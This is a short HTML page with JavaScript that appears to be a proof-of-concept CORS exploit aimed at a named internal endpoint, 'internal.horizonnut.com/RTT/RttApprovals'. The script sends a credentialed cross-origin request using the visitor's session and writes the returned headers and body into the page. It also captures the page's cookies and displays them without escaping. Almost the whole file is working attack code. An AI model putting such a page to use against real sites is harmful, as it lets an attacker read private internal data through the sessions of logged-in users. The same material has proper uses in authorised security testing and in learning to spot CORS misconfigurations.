<!DOCTYPE html>
<html>
<body>
<h2></h2>
<div id="cookieData"></div>
<pre id="responseData"></pre>

<script>
function captureCookies() {
    let cookieStr = document.cookie;
    document.getElementById('cookieData').innerHTML = '<strong>Captured Cookies:</strong><br>' + cookieStr;
    
    document.cookie.split(';').forEach(cookie => console.log(cookie.trim()));
}

fetch('https://internal.horizonnut.com/RTT/RttApprovals', {
    method: 'GET',
    mode: 'cors',
    credentials: 'include'
})
.then(response => {
    console.log('Response status:', response.status);
    console.log('Response headers:', response.headers);
    for (let [key, value] of response.headers) {
        console.log(`${key}: ${value}`);
    }
    return response.text();
})
.then(data => {
    console.log('Response body:', data);
    document.body.innerHTML += '<pre>' + data + '</pre>';
})
.catch(error => {
    console.error('Error:', error);
    document.body.innerHTML += '<p>Error: ' + error.message + '</p>';
});
window.onload = captureCookies;
</script>
</body>
</html>
